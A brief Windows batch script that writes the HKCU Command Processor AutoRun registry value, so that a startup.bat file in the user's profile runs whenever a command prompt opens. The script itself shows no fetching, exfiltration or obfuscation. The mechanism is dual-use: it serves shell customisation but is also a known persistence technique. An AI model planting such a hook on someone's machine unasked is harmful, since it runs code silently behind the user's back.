@echo off

set "SCRIPT=%USERPROFILE%\b3\startup.bat"

reg add "HKCU\Software\Microsoft\Command Processor" ^
/v AutoRun ^
/t REG_SZ ^
/d "call \"%SCRIPT%\"" ^
/f